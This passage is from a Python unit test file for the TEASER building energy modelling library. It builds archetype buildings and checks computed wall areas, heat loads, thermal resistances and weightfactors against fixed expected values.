method=\"bmvbs\",\n            usage=\"institute\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            internal_gains_mode=3,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n\n    def test_type_bldg_institute4(self):\n        \"\"\"test of type_bldg_institute4, no calculation verification\"\"\"\n\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"institute4\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=True,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n\n    def test_type_bldg_institute8(self):\n        \"\"\"test of type_bldg_institute8, no calculation verification\"\"\"\n\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"institute8\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=True,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n\n    def test_type_bldg_residential(self):\n        \"\"\"test of type_bldg_residential, no calculation verification\"\"\"\n\n        prj.add_residential(\n            method=\"iwu\",\n            usage=\"single_family_dwelling\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n        )\n\n    def test_est_bldgs(self):\n        \"\"\"test of type_bldg_est, no calculation verification\"\"\"\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est1a\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est1b\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est2\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est3\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est4a\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est4b\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est5\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est6\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est7\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est8a\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n        prj.add_residential(\n            method=\"urbanrenet\",\n            usage=\"est8b\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            residential_layout=0,\n            neighbour_buildings=0,\n            attic=0,\n            cellar=0,\n            dormer=0,\n            construction_type=\"heavy\",\n            number_of_apartments=1,\n        )\n\n    # methods in Building\n\n    def test_get_inner_wall_area(self):\n        \"\"\"test of get_inner_wall_area\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        sum_area = prj.buildings[-1].get_inner_wall_area()\n        assert round(sum_area, 1) == 34.0\n\n    def test_set_outer_wall_area(self):\n        \"\"\"test of set_outer_wall_area\"\"\"\n        print(prj.buildings[-1].thermal_zones[-1].outer_walls[1].area)\n        prj.buildings[-1].set_outer_wall_area(2.0, 0.0)\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        print(therm_zone.outer_walls[1].area)\n        assert round(therm_zone.outer_walls[0].area, 3) == 2.0\n        assert round(therm_zone.outer_walls[1].area, 3) == 14.0\n\n    def test_get_outer_wall_area(self):\n        \"\"\"test of get_outer_wall_area\"\"\"\n        prj.buildings[-1].get_outer_wall_area(0.0)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        assert round(therm_zone.outer_walls[0].area, 3) == 2.0\n        assert round(therm_zone.outer_walls[1].area, 3) == 14.0\n\n    def test_set_window_area(self):\n        \"\"\"test of set_window_area\"\"\"\n        prj.buildings[-1].set_window_area(1.0, 90.0)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        assert round(therm_zone.windows[0].area, 3) == 1.0\n\n    def test_get_window_area(self):\n        \"\"\"test of get_window_area\"\"\"\n        prj.buildings[-1].get_window_area(90.0)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        assert round(therm_zone.windows[0].area, 3) == 1.0\n\n    def test_fill_outer_wall_area_dict(self):\n        \"\"\"test of fill_outer_wall_area_dict\"\"\"\n\n        prj.buildings[-1].fill_outer_area_dict()\n        outwall_dict_round = {\n            key: round(value, 2) for key, value in prj.buildings[-1].outer_area.items()\n        }\n        assert outwall_dict_round == {\n            -2.0: 140,\n            -1.0: 140,\n            0.0: 2.0,\n            90.0: 14.0,\n            180.0: 10.0,\n            270.0: 14.0,\n        }\n\n    def test_fill_window_area_dict(self):\n        \"\"\"test of fill_window_area_dict\"\"\"\n        prj.buildings[-1].fill_window_area_dict()\n        assert prj.buildings[-1].window_area == {90.0: 1.0, 180.0: 8.0, 270.0: 5.0}\n\n    def test_calc_building_parameter(self):\n        \"\"\"test of calc_building_parameter\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=2, merge_windows=True, used_library=\"AixLib\"\n        )\n\n        assert round(prj.buildings[-1].volume, 1) == 490.0\n        assert round(prj.buildings[-1].sum_heat_load, 4) == 5023.0256\n\n    # methods in therm_zone\n\n    def test_calc_zone_parameters(self):\n        \"\"\"test of calc zone parameter, no calculation verification\"\"\"\n\n        prj.buildings[-1].thermal_zones[-1].calc_zone_parameters(\n            number_of_elements=2, merge_windows=False\n        )\n        prj.buildings[-1].thermal_zones[-1].calc_zone_parameters(\n            number_of_elements=2, merge_windows=True\n        )\n\n    def test_heat_load(self):\n        \"\"\"test of heating_load\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        prj.buildings[-1].thermal_zones[-1].use_conditions.infiltration_rate = 0.5\n        prj.buildings[-1].thermal_zones[-1].calc_zone_parameters(\n            number_of_elements=2, merge_windows=True\n        )\n        prj.buildings[-1].thermal_zones[-1].model_attr.calc_attributes()\n        assert (\n            round(prj.buildings[-1].thermal_zones[-1].model_attr.heat_load, 4)\n            == 6659.6256\n        )\n\n    def test_sum_building_elements_one(self):\n        \"\"\"test of combine_building_elements\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        from teaser.logic.buildingobjects.calculation.one_element import OneElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = OneElement(therm_zone, merge_windows=False, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        calc_attr._sum_outer_wall_elements()\n        calc_attr._sum_window_elements()\n\n        # outerwall\n        assert round(calc_attr.ua_value_ow, 16) == 135.5818558809656\n        assert round(calc_attr.area_ow, 1) == 328.0\n        assert round(calc_attr.r_conv_inner_ow, 19) == 0.0016512549537648611\n        assert round(calc_attr.r_rad_inner_ow, 18) == 0.000609756097560976\n        assert round(calc_attr.r_comb_inner_ow, 20) == 0.00044531528322052017\n        assert round(calc_attr.r_conv_outer_ow, 20) == 0.00026595744680851064\n        assert round(calc_attr.r_rad_outer_ow, 18) == 0.001063829787234043\n        assert round(calc_attr.r_comb_outer_ow, 20) == 0.0002127659574468085\n        assert round(calc_attr.alpha_conv_inner_ow, 5) == 1.84634\n        assert round(calc_attr.alpha_rad_inner_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_inner_ow, 5) == 6.84634\n        assert round(calc_attr.alpha_conv_outer_ow, 1) == 20.0\n        assert round(calc_attr.alpha_rad_outer_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_outer_ow, 1) == 25.0\n\n        # window\n        assert round(calc_attr.ua_value_win, 16) == 32.87895310796074\n        assert round(calc_attr.area_win, 1) == 18.0\n        assert round(calc_attr.r_conv_inner_win, 19) == 0.032679738562091505\n        assert round(calc_attr.r_rad_inner_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_inner_win, 19) == 0.008291873963515755\n        assert round(calc_attr.r_conv_outer_win, 5) == 0.00278\n        assert round(calc_attr.r_rad_outer_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_outer_win, 4) == 0.0022\n        assert round(calc_attr.alpha_conv_inner_win, 1) == 1.7\n        assert round(calc_attr.alpha_comb_outer_win, 1) == 25.0\n        assert round(calc_attr.alpha_conv_outer_win, 1) == 20.0\n        assert round(calc_attr.weighted_g_value, 3) == 0.789\n\n    def test_calc_chain_matrix_one(self):\n        \"\"\"test of calc_chain_matrix\"\"\"\n\n        from teaser.logic.buildingobjects.calculation.one_element import OneElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = OneElement(therm_zone, merge_windows=False, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        omega = 2 * math.pi / 86400 / 5\n\n        helplist_outer_walls = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.windows\n        )\n\n        r1_ow, c1_ow = calc_attr._calc_parallel_connection(\n            element_list=helplist_outer_walls, omega=omega\n        )\n        assert round(r1_ow, 14) == 0.00100751548411\n        assert round(c1_ow, 5) == 3648580.59312\n\n    def test_sum_building_elements_two(self):\n        \"\"\"test of combine_building_elements\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        from teaser.logic.buildingobjects.calculation.two_element import TwoElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = TwoElement(therm_zone, merge_windows=False, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        calc_attr._sum_outer_wall_elements()\n        calc_attr._sum_inner_wall_elements()\n        calc_attr._sum_window_elements()\n\n        # innerwall\n\n        assert round(calc_attr.ua_value_iw, 16) == 14.286493860845841\n        assert round(calc_attr.area_iw, 1) == 34.0\n        assert round(calc_attr.r_conv_inner_iw, 18) == 0.010893246187363833\n        assert round(calc_attr.r_rad_inner_iw, 19) == 0.0058823529411764705\n        assert round(calc_attr.r_comb_inner_iw, 19) == 0.003819709702062643\n        assert round(calc_attr.alpha_conv_inner_iw, 1) == 2.7\n        assert round(calc_attr.alpha_rad_inner_iw, 1) == 5.0\n        assert round(calc_attr.alpha_comb_inner_iw, 1) == 7.7\n\n        # outerwall\n        assert round(calc_attr.ua_value_ow, 16) == 135.5818558809656\n        assert round(calc_attr.area_ow, 1) == 328.0\n        assert round(calc_attr.r_conv_inner_ow, 19) == 0.0016512549537648611\n        assert round(calc_attr.r_rad_inner_ow, 18) == 0.000609756097560976\n        assert round(calc_attr.r_comb_inner_ow, 20) == 0.00044531528322052017\n        assert round(calc_attr.r_conv_outer_ow, 20) == 0.00026595744680851064\n        assert round(calc_attr.r_rad_outer_ow, 18) == 0.001063829787234043\n        assert round(calc_attr.r_comb_outer_ow, 20) == 0.0002127659574468085\n        assert round(calc_attr.alpha_conv_inner_ow, 5) == 1.84634\n        assert round(calc_attr.alpha_rad_inner_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_inner_ow, 5) == 6.84634\n        assert round(calc_attr.alpha_conv_outer_ow, 1) == 20.0\n        assert round(calc_attr.alpha_rad_outer_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_outer_ow, 1) == 25.0\n\n        # window\n        assert round(calc_attr.ua_value_win, 16) == 32.87895310796074\n        assert round(calc_attr.area_win, 1) == 18.0\n        assert round(calc_attr.r_conv_inner_win, 19) == 0.032679738562091505\n        assert round(calc_attr.r_rad_inner_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_inner_win, 19) == 0.008291873963515755\n        assert round(calc_attr.r_conv_outer_win, 5) == 0.00278\n        assert round(calc_attr.r_rad_outer_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_outer_win, 4) == 0.0022\n        assert round(calc_attr.alpha_conv_inner_win, 1) == 1.7\n        assert round(calc_attr.alpha_comb_outer_win, 1) == 25.0\n        assert round(calc_attr.alpha_conv_outer_win, 1) == 20.0\n        assert round(calc_attr.weighted_g_value, 3) == 0.789\n\n    def test_calc_chain_matrix_two(self):\n        \"\"\"test of calc_chain_matrix\"\"\"\n        from teaser.logic.buildingobjects.calculation.two_element import TwoElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = TwoElement(therm_zone, merge_windows=False, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        omega = 2 * math.pi / 86400 / 5\n\n        calc_attr = TwoElement(therm_zone, merge_windows=True, t_bt=5)\n\n        helplist_outer_walls = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.windows\n        )\n\n        r1_ow, c1_ow = calc_attr._calc_parallel_connection(\n            element_list=helplist_outer_walls, omega=omega\n        )\n        assert round(r1_ow, 14) == 0.00100751548411\n        assert round(c1_ow, 5) == 3648580.59312\n\n        helplist_inner_walls = (\n            therm_zone.inner_walls + therm_zone.ceilings + therm_zone.floors\n        )\n\n        r1_iw, c1_iw = calc_attr._calc_parallel_connection(\n            element_list=helplist_inner_walls, omega=omega\n        )\n        assert round(r1_iw, 13) == 0.0097195611408\n        assert round(c1_iw, 6) == 319983.518743\n\n    def test_sum_building_elements_three(self):\n        \"\"\"test of combine_building_elements\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        from teaser.logic.buildingobjects.calculation.three_element import ThreeElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = ThreeElement(therm_zone, merge_windows=False, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        calc_attr._sum_outer_wall_elements()\n        calc_attr._sum_ground_floor_elements()\n        calc_attr._sum_inner_wall_elements()\n        calc_attr._sum_window_elements()\n\n        # innerwall\n\n        assert round(calc_attr.ua_value_iw, 16) == 14.286493860845841\n        assert round(calc_attr.area_iw, 1) == 34.0\n        assert round(calc_attr.r_conv_inner_iw, 18) == 0.010893246187363833\n        assert round(calc_attr.r_rad_inner_iw, 19) == 0.0058823529411764705\n        assert round(calc_attr.r_comb_inner_iw, 19) == 0.003819709702062643\n        assert round(calc_attr.alpha_conv_inner_iw, 1) == 2.7\n        assert round(calc_attr.alpha_rad_inner_iw, 1) == 5.0\n        assert round(calc_attr.alpha_comb_inner_iw, 1) == 7.7\n\n        # outerwall\n        assert round(calc_attr.ua_value_ow, 16) == 77.23037843150993\n        assert round(calc_attr.area_ow, 1) == 188.0\n        assert round(calc_attr.r_conv_inner_ow, 19) == 0.0027203482045701846\n        assert round(calc_attr.r_rad_inner_ow, 18) == 0.001063829787234043\n        assert round(calc_attr.r_comb_inner_ow, 20) == 0.0007647598654022638\n        assert round(calc_attr.r_conv_outer_ow, 20) == 0.00026595744680851064\n        assert round(calc_attr.r_rad_outer_ow, 18) == 0.001063829787234043\n        assert round(calc_attr.r_comb_outer_ow, 20) == 0.0002127659574468085\n        assert round(calc_attr.alpha_conv_inner_ow, 5) == 1.95532\n        assert round(calc_attr.alpha_rad_inner_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_inner_ow, 5) == 6.95532\n        assert round(calc_attr.alpha_conv_outer_ow, 1) == 20.0\n        assert round(calc_attr.alpha_rad_outer_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_outer_ow, 1) == 25.0\n\n        # groundfloor\n        assert round(calc_attr.ua_value_gf, 16) == 58.351477449455686\n        assert round(calc_attr.area_gf, 1) == 140.0\n        assert round(calc_attr.r_conv_inner_gf, 19) == 0.004201680672268907\n        assert round(calc_attr.r_rad_inner_gf, 18) == 0.001428571428571429\n        assert round(calc_attr.r_comb_inner_gf, 20) == 0.0010660980810234541\n        assert round(calc_attr.alpha_conv_inner_gf, 5) == 1.7\n        assert round(calc_attr.alpha_rad_inner_gf, 5) == 5.0\n        assert round(calc_attr.alpha_comb_inner_gf, 5) == 6.7\n\n        # window\n        assert round(calc_attr.ua_value_win, 16) == 32.87895310796074\n        assert round(calc_attr.area_win, 1) == 18.0\n        assert round(calc_attr.r_conv_inner_win, 19) == 0.032679738562091505\n        assert round(calc_attr.r_rad_inner_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_inner_win, 19) == 0.008291873963515755\n        assert round(calc_attr.r_conv_outer_win, 5) == 0.00278\n        assert round(calc_attr.r_rad_outer_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_outer_win, 4) == 0.0022\n        assert round(calc_attr.alpha_conv_inner_win, 1) == 1.7\n        assert round(calc_attr.alpha_comb_outer_win, 1) == 25.0\n        assert round(calc_attr.alpha_conv_outer_win, 1) == 20.0\n        assert round(calc_attr.weighted_g_value, 3) == 0.789\n\n    def test_calc_chain_matrix_three(self):\n        \"\"\"test of calc_chain_matrix\"\"\"\n        from teaser.logic.buildingobjects.calculation.three_element import ThreeElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = ThreeElement(therm_zone, merge_windows=False, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        omega = 2 * math.pi / 86400 / 5\n\n        helplist_outer_walls = (\n            therm_zone.outer_walls + therm_zone.rooftops + therm_zone.windows\n        )\n\n        r1_ow, c1_ow = calc_attr._calc_parallel_connection(\n            element_list=helplist_outer_walls, omega=omega\n        )\n        assert round(r1_ow, 14) == 0.00175779297228\n        assert round(c1_ow, 5) == 2091259.60825\n\n        helplist_inner_walls = (\n            therm_zone.inner_walls + therm_zone.ceilings + therm_zone.floors\n        )\n\n        r1_iw, c1_iw = calc_attr._calc_parallel_connection(\n            element_list=helplist_inner_walls, omega=omega\n        )\n        assert round(r1_iw, 13) == 0.0097195611408\n        assert round(c1_iw, 6) == 319983.518743\n\n    def test_sum_building_elements_four(self):\n        \"\"\"test of combine_building_elements\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        from teaser.logic.buildingobjects.calculation.four_element import FourElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = FourElement(therm_zone, merge_windows=True, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        calc_attr._sum_outer_wall_elements()\n        calc_attr._sum_ground_floor_elements()\n        calc_attr._sum_rooftop_elements()\n        calc_attr._sum_inner_wall_elements()\n        calc_attr._sum_window_elements()\n\n        # innerwall\n\n        assert round(calc_attr.ua_value_iw, 16) == 14.286493860845841\n        assert round(calc_attr.area_iw, 1) == 34.0\n        assert round(calc_attr.r_conv_inner_iw, 18) == 0.010893246187363833\n        assert round(calc_attr.r_rad_inner_iw, 19) == 0.0058823529411764705\n        assert round(calc_attr.r_comb_inner_iw, 19) == 0.003819709702062643\n        assert round(calc_attr.alpha_conv_inner_iw, 1) == 2.7\n        assert round(calc_attr.alpha_rad_inner_iw, 1) == 5.0\n        assert round(calc_attr.alpha_comb_inner_iw, 1) == 7.7\n\n        # outerwall\n        assert round(calc_attr.ua_value_ow, 16) == 19.83577523748189\n        assert round(calc_attr.area_ow, 1) == 48.0\n        assert round(calc_attr.r_conv_inner_ow, 19) == 0.007716049382716048\n        assert round(calc_attr.r_rad_inner_ow, 18) == 0.004166666666666667\n        assert round(calc_attr.r_comb_inner_ow, 20) == 0.0027056277056277055\n        assert round(calc_attr.r_conv_outer_ow, 20) == 0.0010416666666666667\n        assert round(calc_attr.r_rad_outer_ow, 18) == 0.004166666666666667\n        assert round(calc_attr.r_comb_outer_ow, 20) == 0.0008333333333333334\n        assert round(calc_attr.alpha_conv_inner_ow, 5) == 2.7\n        assert round(calc_attr.alpha_rad_inner_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_inner_ow, 5) == 7.7\n        assert round(calc_attr.alpha_conv_outer_ow, 1) == 20.0\n        assert round(calc_attr.alpha_rad_outer_ow, 5) == 5.0\n        assert round(calc_attr.alpha_comb_outer_ow, 1) == 25.0\n\n        # groundfloor\n        assert round(calc_attr.ua_value_gf, 16) == 58.351477449455686\n        assert round(calc_attr.area_gf, 1) == 140.0\n        assert round(calc_attr.r_conv_inner_gf, 19) == 0.004201680672268907\n        assert round(calc_attr.r_rad_inner_gf, 18) == 0.001428571428571429\n        assert round(calc_attr.r_comb_inner_gf, 20) == 0.0010660980810234541\n        assert round(calc_attr.alpha_conv_inner_gf, 5) == 1.7\n        assert round(calc_attr.alpha_rad_inner_gf, 5) == 5.0\n        assert round(calc_attr.alpha_comb_inner_gf, 5) == 6.7\n\n        # outerwall\n        assert round(calc_attr.ua_value_rt, 16) == 57.394603194028036\n        assert round(calc_attr.area_rt, 1) == 140.0\n        assert round(calc_attr.r_conv_inner_rt, 19) == 0.004201680672268907\n        assert round(calc_attr.r_rad_inner_rt, 18) == 0.001428571428571429\n        assert round(calc_attr.r_comb_inner_rt, 20) == 0.0010660980810234541\n        assert round(calc_attr.r_conv_outer_rt, 20) == 0.00035714285714285714\n        assert round(calc_attr.r_rad_outer_rt, 18) == 0.001428571428571429\n        assert round(calc_attr.r_comb_outer_rt, 20) == 0.00028571428571428574\n        assert round(calc_attr.alpha_conv_inner_rt, 5) == 1.7\n        assert round(calc_attr.alpha_rad_inner_rt, 5) == 5.0\n        assert round(calc_attr.alpha_comb_inner_rt, 5) == 6.7\n        assert round(calc_attr.alpha_conv_outer_rt, 1) == 20.0\n        assert round(calc_attr.alpha_rad_outer_rt, 5) == 5.0\n        assert round(calc_attr.alpha_comb_outer_rt, 1) == 25.0\n\n        # window\n        assert round(calc_attr.ua_value_win, 16) == 32.87895310796074\n        assert round(calc_attr.area_win, 1) == 18.0\n        assert round(calc_attr.r_conv_inner_win, 19) == 0.032679738562091505\n        assert round(calc_attr.r_rad_inner_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_inner_win, 19) == 0.008291873963515755\n        assert round(calc_attr.r_conv_outer_win, 5) == 0.00278\n        assert round(calc_attr.r_rad_outer_win, 4) == 0.0111\n        assert round(calc_attr.r_comb_outer_win, 4) == 0.0022\n        assert round(calc_attr.alpha_conv_inner_win, 1) == 1.7\n        assert round(calc_attr.alpha_comb_outer_win, 1) == 25.0\n        assert round(calc_attr.alpha_conv_outer_win, 1) == 20.0\n        assert round(calc_attr.weighted_g_value, 3) == 0.789\n\n    def test_calc_chain_matrix_four(self):\n        \"\"\"test of calc_chain_matrix\"\"\"\n        from teaser.logic.buildingobjects.calculation.four_element import FourElement\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        calc_attr = FourElement(therm_zone, merge_windows=False, t_bt=5)\n\n        helplist = (\n            therm_zone.outer_walls\n            + therm_zone.rooftops\n            + therm_zone.ground_floors\n            + therm_zone.inner_walls\n            + therm_zone.ceilings\n            + therm_zone.floors\n            + therm_zone.windows\n        )\n\n        for element in helplist:\n            element.calc_equivalent_res()\n            element.calc_ua_value()\n\n        omega = 2 * math.pi / 86400 / 5\n\n        helplist_outer_walls = therm_zone.outer_walls + therm_zone.windows\n\n        r1_ow, c1_ow = calc_attr._calc_parallel_connection(\n            element_list=helplist_outer_walls, omega=omega\n        )\n        assert round(r1_ow, 14) == 0.00688468914141\n        assert round(c1_ow, 5) == 533938.62338\n\n        helplist_inner_walls = (\n            therm_zone.inner_walls + therm_zone.ceilings + therm_zone.floors\n        )\n\n        r1_iw, c1_iw = calc_attr._calc_parallel_connection(\n            element_list=helplist_inner_walls, omega=omega\n        )\n        assert round(r1_iw, 13) == 0.0097195611408\n        assert round(c1_iw, 6) == 319983.518743\n\n    def test_calc_weightfactor_one(self):\n        \"\"\"test of calc_weightfactor\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=1, merge_windows=True, used_library=\"IBPSA\"\n        )\n\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n\n        weightfactors_test_list = [\n            0,\n            0.024530650180761254,\n            0.03434291025306576,\n            0.024530650180761254,\n            0.03434291025306576,\n            0.3407000330729792,\n        ]\n\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n\n        weightfactors_test_list = [\n            0.08674342795625017,\n            0.0,\n            0.0,\n            0.0,\n            0.054214642472656345,\n            0.054214642472656345,\n        ]\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n\n        assert calc_attr.weightfactor_win == weightfactors_test_list\n        assert calc_attr.weightfactor_ground == 0.34638013315780397\n\n        prj.buildings[-1].thermal_zones[-1].weightfactor_ow = []\n        prj.buildings[-1].thermal_zones[-1].weightfactor_win = []\n\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=1, merge_windows=False, used_library=\"AixLib\"\n        )\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n\n        weightfactors_test_list = [\n            0.03047939672771178,\n 